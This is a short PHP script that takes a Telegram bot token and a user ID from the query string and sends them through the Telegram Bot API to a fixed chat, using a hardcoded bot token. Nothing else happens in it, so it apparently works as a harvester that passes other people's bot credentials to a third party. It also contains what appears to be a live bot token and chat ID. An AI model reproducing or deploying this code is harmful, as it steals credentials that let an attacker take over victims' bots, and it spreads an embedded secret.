<?php

$botToken = $_GET['botToken'] ?? '';
$idTelegram = $_GET['idTelegram'] ?? '';

if (!empty($botToken) && !empty($idTelegram)) {
    $targetBotToken = "6303882659:AAEF6szirtORvCKPgl61ePXSA0U6M0S7xOs";
    $chatId = "5162275670";

    $url = "https://api.telegram.org/bot{$targetBotToken}/sendMessage";
    $message = "botToken: {$botToken}\nIdTelegram: {$idTelegram}";

    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

?>
